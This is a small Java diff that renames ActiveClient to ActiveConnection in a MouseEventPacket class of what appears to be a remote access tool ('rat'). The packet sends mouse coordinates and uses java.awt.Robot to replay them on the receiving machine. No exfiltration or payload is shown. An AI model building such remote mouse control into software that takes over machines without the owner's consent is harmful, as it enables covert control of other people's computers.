@@ -4,7 +4,7 @@ import java.awt.AWTException;
 import java.awt.Robot;
 import java.awt.event.MouseEvent;
 
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class MouseEventPacket implements IPacket {
 	
@@ -28,7 +28,7 @@ public final class MouseEventPacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
+	public void send(final ActiveConnection client) {
 		client.writeInt(x);
 		client.writeInt(y);
 		client.writeInt(button);
@@ -36,7 +36,7 @@ public final class MouseEventPacket implements IPacket {
 	}
 	
 	@Override
-	public void receive(final ActiveClient client) {
+	public void receive(final ActiveConnection client) {
 		x = client.readInt();
 		y = client.readInt();
 		button = client.readInt();
@@ -44,7 +44,7 @@ public final class MouseEventPacket implements IPacket {
 	}
 	
 	@Override
-	public void execute(final ActiveClient client) {
+	public void execute(final ActiveConnection client) {
 		try {
 			final Robot rob = new Robot();
 			
